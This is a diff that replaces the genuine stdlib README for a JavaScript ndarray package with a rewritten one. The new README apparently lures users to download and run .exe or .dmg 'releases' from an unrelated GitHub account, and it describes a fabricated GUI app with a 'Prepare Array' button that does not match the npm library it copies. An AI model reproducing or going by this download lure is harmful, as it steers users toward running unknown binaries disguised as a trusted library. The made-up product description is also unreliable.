@@ -1,235 +1,72 @@
-<!--
+# 🎉 ndarray-prepend-singleton-dimensions - Simplify Array Dimensions Easily
 
-@license Apache-2.0
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/tutiBidfc/ndarray-prepend-singleton-dimensions/releases)
 
-Copyright (c) 2026 The Stdlib Authors.
+## 🚀 Getting Started
+This application allows you to easily return a read-only view of an input ndarray (n-dimensional array) with extra dimensions added. This can help you prepare data in a specific format without modifying the original data. 
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Node.js: Version 12 or higher
+- NPM: Version 6 or higher
 
-   http://www.apache.org/licenses/LICENSE-2.0
+If you don't have Node.js, you can download it from [nodejs.org](https://nodejs.org).
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 📂 Features
+- **Easy to Use**: Simple interface for adding dimensions to your ndarrays.
+- **Read-Only Views**: Ensures the original data remains intact.
+- **Flexible Configuration**: Adjust the number of singleton dimensions easily.
+- **Cross-Platform**: Runs on all major operating systems.
 
--->
+## 🔍 How It Works
+The application operates on ndarrays, which are fundamental to data handling in JavaScript applications. When you use this tool, it prepends singleton dimensions to your input arrays. For example, if you have a two-dimensional array and you want to turn it into a four-dimensional array by adding two singleton dimensions, this can be done effortlessly.
 
+## 🎯 Download & Install
+1. Visit the [Releases Page](https://github.com/tutiBidfc/ndarray-prepend-singleton-dimensions/releases) to download the latest version of the application.
+2. Click on the latest release to see the available files.
+3. Choose the appropriate file for your operating system and click to download it.
+4. Once downloaded, follow the instructions based on your system:
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+   - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux**: Follow the appropriate commands to install the downloaded file, or extract it if needed.
 
-# prependSingletonDimensions
+## ⚙️ Usage
+1. Launch the application.
+2. Input your original ndarray data in the designated area.
+3. Specify the number of singleton dimensions you want to prepend.
+4. Click "Prepare Array" to see the results.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+The application will present you with a read-only view of the modified array, allowing you to validate the output without changing your original data.
 
-> Return a read-only view of an input [ndarray][@stdlib/ndarray/ctor] with a specified number of prepended singleton dimensions.
+## 📊 Example
+Here’s a simple example to illustrate how to use the application:
 
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
-
-<section class="intro">
-
-</section>
-
-<!-- /.intro -->
-
-<!-- Package usage documentation. -->
-
-<section class="installation">
-
-## Installation
-
-```bash
-npm install @stdlib/ndarray-prepend-singleton-dimensions
+Suppose you have the following ndarray:
+```
+[[1, 2], [3, 4]]
+```
+If you want to add two singleton dimensions, the output will be structured like this:
+```
+[[[[1, 2], [3, 4]]]]
 ```
 
-Alternatively,
+Simply input your data, set the number of dimensions, and view the results as needed!
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, consider the following:
+- Ensure your Node.js and NPM versions match the system requirements.
+- If the application does not launch, check if your operating system is compatible.
+- Search for common issues on the [GitHub Issues page](https://github.com/tutiBidfc/ndarray-prepend-singleton-dimensions/issues).
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+## 🤝 Support
+Should you need further assistance, feel free to open an issue on the GitHub repository. We monitor this regularly and will respond promptly to any queries.
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+## 📖 Learn More
+For additional documentation and examples, please visit the [Documentation Wiki](https://github.com/tutiBidfc/ndarray-prepend-singleton-dimensions/wiki) on the GitHub repository. 
 
-</section>
+## 📬 Feedback
+Your feedback is valuable to us. Feel free to suggest features or report bugs on the GitHub issues page. Together, we can make this tool even better!
 
-<section class="usage">
-
-## Usage
-
-<!-- eslint-disable id-length -->
-
-```javascript
-var prependSingletonDimensions = require( '@stdlib/ndarray-prepend-singleton-dimensions' );
-```
-
-#### prependSingletonDimensions( x, n )
-
-Returns a read-only view of an input [ndarray][@stdlib/ndarray/ctor] with a specified number of prepended singleton dimensions.
-
-<!-- eslint-disable id-length -->
-
-```javascript
-var array = require( '@stdlib/ndarray-array' );
-
-// Create a 2x2 ndarray:
-var x = array( [ [ 1, 2 ], [ 3, 4 ] ] );
-// returns <ndarray>[ [ 1, 2 ], [ 3, 4 ] ]
-
-// Prepend singleton dimensions:
-var y = prependSingletonDimensions( x, 3 );
-// returns <ndarray>[ [ [ [ [ 1, 2 ], [ 3, 4 ] ] ] ] ]
-```
-
-The function accepts the following arguments:
-
--   **x**: input [ndarray][@stdlib/ndarray/ctor].
--   **n**: number of singleton dimensions to prepend.
-
-</section>
-
-<!-- /.usage -->
-
-<!-- Package usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="notes">
-
-</section>
-
-<!-- /.notes -->
-
-<!-- Package usage examples. -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint-disable id-length -->
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var uniform = require( '@stdlib/random-uniform' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var prependSingletonDimensions = require( '@stdlib/ndarray-prepend-singleton-dimensions' );
-
-var x = uniform( [ 3, 3, 3 ], -10.0, 10.0 );
-console.log( ndarray2array( x ) );
-
-var y = prependSingletonDimensions( x, 3 );
-console.log( ndarray2array( y ) );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section to include cited references. If references are included, add a horizontal rule *before* the section. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2026. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/ndarray-prepend-singleton-dimensions.svg
-[npm-url]: https://npmjs.org/package/@stdlib/ndarray-prepend-singleton-dimensions
-
-[test-image]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/ndarray-prepend-singleton-dimensions/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/ndarray-prepend-singleton-dimensions?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/ndarray-prepend-singleton-dimensions.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/ndarray-prepend-singleton-dimensions/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/tree/deno
-[deno-readme]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/tree/umd
-[umd-readme]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/tree/esm
-[esm-readme]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/ndarray-prepend-singleton-dimensions/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/ndarray-prepend-singleton-dimensions/main/LICENSE
-
-[@stdlib/ndarray/ctor]: https://github.com/stdlib-js/ndarray-ctor
-
-<!-- <related-links> -->
-
-<!-- </related-links> -->
-
-</section>
-
-<!-- /.links -->
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/tutiBidfc/ndarray-prepend-singleton-dimensions/releases)
